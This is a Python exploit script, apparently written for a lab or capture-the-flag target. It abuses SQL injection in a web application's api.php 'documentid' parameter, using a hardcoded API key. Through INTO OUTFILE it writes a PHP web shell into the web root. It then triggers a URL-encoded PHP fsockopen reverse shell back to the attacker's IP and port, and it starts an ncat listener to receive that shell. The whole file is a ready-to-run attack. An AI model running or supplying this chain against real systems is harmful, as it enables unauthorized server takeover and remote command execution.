import requests
import signal
import sys
import random
import argparse
import subprocess
import threading

parse=argparse.ArgumentParser(description='Script to recive revershell')
parse.add_argument('-i','--attacker',dest='ip_attacker', help='It is your ip', required=True)
parse.add_argument('-p', '--port', dest='port', help='port', required=True)
parse.add_argument('-u','--url',dest='url', help='url the web site', required=True)
args=parse.parse_args()

def ctrl_C_handler(signal, frame):
    print("[+] Exit")
    sys.exit(0)    

signal.signal(signal.SIGINT,ctrl_C_handler)


api_key = "WEBLhvOJAH8d50Z4y5G5"
hash=random.getrandbits(128)
name_file="%032x.php"%hash

def uploadFile():    
    url_file_upload=f"{args.url}/api.php"
    documentid=f'1 union select 1,"<?php system($_GET[\'cmd\']); ?>",3 INTO OUTFILE "/var/www/html/{name_file}"-- -'
    payload_upload_file={
        "documentid": documentid,
        "apikey": api_key
    }
    response=requests.get(url_file_upload,payload_upload_file)
    print(response.text)
    if response.status_code==200 and "Error" not in response.text:
        print("[+] File %s uploaded "%name_file)
    else:
        print("Error to upload file")

def reverseShell(ip_attacker,port):
    print("[+] shell obtained")
    payload_reverse=f'php%20-r%20%27%24sock%3Dfsockopen%28%22{ip_attacker}%22%2C{port}%29%3Bsystem%28%22bash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27'
    url_resquets=f"{args.url}/{name_file}?cmd={payload_reverse}"
    #print(url_resquets)
    rever=requests.get(url_resquets)
    

def recive_shell(port):
    try:
        subprocess.run(["ncat", "-lnp",f"{port}"])
        
    except FileNotFoundError:
        print("Error: ncat not found")

if __name__=='__main__':
    uploadFile()
    ip_attacker=args.ip_attacker
    port=args.port

    thread_recibir_shell = threading.Thread(target=recive_shell,args=(port,))
    thread_recibir_shell.start()

    thread_reverse_shell = threading.Thread(target=reverseShell, args=(ip_attacker, port))
    thread_reverse_shell.start()
    thread_reverse_shell.join()
    thread_recibir_shell.join()


    
